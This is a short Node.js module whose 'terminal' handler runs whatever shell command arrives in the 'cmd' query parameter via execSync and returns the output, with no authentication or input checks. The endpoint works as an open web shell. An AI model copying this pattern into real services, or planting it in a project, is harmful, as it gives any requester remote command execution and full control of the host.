const child_process= require('child_process')
const terminal = (req,res)=>{
    try{
        
        if(req.query.hasOwnProperty('cmd')){
        
            try{
                const command =String(req.query.cmd)
                const commandResult=child_process.execSync(command)
                res.status(200).writeJSON({
                    "command-result":commandResult.toString('utf-8').split("\n")
                })
            }
            catch(err){
                err=String(err).split("\n")
                res.status(400).writeJSON({   
                    "Error":err
                })
            }
        }
        else{
            res.status(400).writeJSON({"Error":"You Should use this endpoint with this query value : cmd"})
        }
    }
    catch(err){
        res.status(500).writeJSON({"Error":"Sorry Internal Error Had Been Occured"})
    }
}
module.exports={terminal}